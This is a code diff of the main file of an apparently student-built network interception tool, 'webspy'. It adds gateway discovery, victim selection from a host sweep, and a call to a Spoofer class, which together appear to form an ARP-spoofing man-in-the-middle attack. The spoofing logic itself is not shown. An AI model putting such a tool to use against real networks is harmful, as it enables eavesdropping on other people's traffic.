@@ -21,9 +21,10 @@
 #include <linux/if_link.h>
 
 //wepspy
-#include "WebSpyGlobals.h"
+#include "Globals.h"
 #include "Sweeper.h"
 #include "Host.h"
+#include "Spoofer.h"
 
 using namespace std;
 
@@ -44,11 +45,11 @@ static void parseProgramArguments(int argc, char* argv[]){
 		if(arg == "-h" || arg == "--help"){
 			showUsage(EXIT_SUCCESS);
 		} else if(arg == "-l" || arg == "--logging"){
-			WebSpyGlobals::logging = true;
+			Globals::logging = true;
 		} else if(arg == "-v" || arg == "--verbose"){
-			WebSpyGlobals::verbose = true;
+			Globals::verbose = true;
 		} else if(arg == "-i" || arg == "--iface"){
-			WebSpyGlobals::iface = argv[i + 1];
+			Globals::iface = argv[i + 1];
 			i++;
 		} else{
 			printf("Unrecognized argument: %s\n", argv[i]);
@@ -56,12 +57,6 @@ static void parseProgramArguments(int argc, char* argv[]){
 		}
 	}
 }
-
-/*
-static void selectVictim(vector<Host>& avaiableHosts){
-	// TODO
-}
-*/
 
 static void showAvaiableInterfaces(std::vector<char*>& ifaceNames){
 	struct ifaddrs *ifaces, *it;
@@ -105,7 +100,7 @@ static void selectInterface(){
 	getchar();
 	// TODO teste de leitura do scanf
 
-	WebSpyGlobals::iface = ifacesNames[opt - 1];
+	Globals::iface = ifacesNames[opt - 1];
 }
 
 static Host& selectVictim(vector<Host> hosts){
@@ -126,45 +121,40 @@ static Host& selectVictim(vector<Host> hosts){
 int main(int argc, char* argv[]){
 	parseProgramArguments(argc, argv);
 
-	if(WebSpyGlobals::iface == NULL){
+	if(Globals::iface == NULL){
 		selectInterface();
-	} else{
-
 	}
 
-	WebSpyGlobals::context = libnet_init(LIBNET_LINK_ADV, WebSpyGlobals::iface, WebSpyGlobals::libnetErrBuffer);
+	if(Globals::verbose)
+		printf("Inteface selected: %s\n", Globals::iface);
 
-	if(!WebSpyGlobals::context){
-		fprintf(stderr, "webspy: [ERRO] LibNet Error: %s", WebSpyGlobals::libnetErrBuffer);
-		exit(EXIT_FAILURE);
-	}
+	Globals::findAttacker();
+	Globals::findGateway();
 
-	if(WebSpyGlobals::verbose)
-		printf("\nInteface selected: %s\n", WebSpyGlobals::iface);
 
-	WebSpyGlobals::attacker.setIP(libnet_get_ipaddr4(WebSpyGlobals::context));
-	WebSpyGlobals::attacker.setMAC(libnet_get_hwaddr(WebSpyGlobals::context));
-	WebSpyGlobals::attacker.setName(string("Attacker"));
-	if(WebSpyGlobals::verbose){
+	if(Globals::verbose){
 		printf("Your machine -> ");
-		WebSpyGlobals::attacker.toString();
+		Globals::attacker.toString();
 	}
 
 	Sweeper sweeper;
-	vector<Host> avaiableHosts = sweeper.sweep();
+	vector<Host>& avaiableHosts = sweeper.sweep();
 	if(avaiableHosts.size() == 0){
 		printf("No hosts on the net besides you. Exiting...\n");
 		exit(EXIT_SUCCESS);
 	}
 
-	Host& victim = selectVictim(avaiableHosts);
-	victim.toString();
+	if(!Globals::gateway.ip){
+		printf("Gateway host could not be found, select one below:\n\n");
+		Globals::gateway = selectVictim(avaiableHosts);
+	}
+	Globals::victim = selectVictim(avaiableHosts);
+
+	Spoofer spoofer;
+	spoofer.spoof();
+
+
 	/*
-	TODO pegar IP e MAC do Gateway
-	Host gateway = Host::findGateway(iface);
-
-	Spoofer spoofer(gateway, victim);
-
 	Pipe gateway2victim(gateway, victim);
 	Pipe victim2gateway(victim, gateway);
 
